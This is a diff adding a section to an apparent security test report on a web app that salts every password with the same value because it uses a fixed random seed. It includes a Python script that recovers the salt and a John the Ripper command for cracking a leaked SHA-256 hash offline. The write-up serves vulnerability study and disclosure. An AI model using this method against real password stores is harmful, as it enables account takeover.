@@ -46,3 +46,32 @@ This utilizes the vulnerable parameter, signature, within the variable "card_que
 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+(4) This test relies on the results from test 3 above and the hashed password displayed: 18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3
+This test also relies on the same "RANDOM_SEED" value used for each registered user.
+  -> Because the generator’s random() function will continue to produce the same sequence when the compatible seeder is given the same seed.
+  -> And "RANDOM_SEED" with a value of "2RUHYAyJWdDdXOicZfnTRw==" is given to the random() function for every user registered.
+  -> This will produce the same sequence for all users because of the same seed.
+  -> Hence, all users passwords will be salted with the same value of 30930.
+  
+This python script below allowed us to find the salt value, used with sha256(). 
+All the registered users on this website will have passwords salted with the value of 30930. We know this from this script below:
+---
+import random
+import base64
+from binascii import hexlify
+
+length = 16
+RANDOM_SEED = base64.b64decode("2RUHYAyJWdDdXOicZfnTRw==")
+random.seed(RANDOM_SEED)
+print(hexlify(random.randint(0, 2**length-1).to_bytes(length, byteorder='big')))
+print(random.randint(0, 2**length-1))
+
+# printed: salt (in bytes) from above w/ hexlify = b'000000000000000000000000000078d2'
+# printed: salt (in base 10 form) is = 30930
+---
+
+If the hashed password (18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3) is saved to a file called: toBrute.txt
+Then, from the commandline, attackers can run: ./john --format=Raw-SHA256 --salts=30930 toBrute.txt
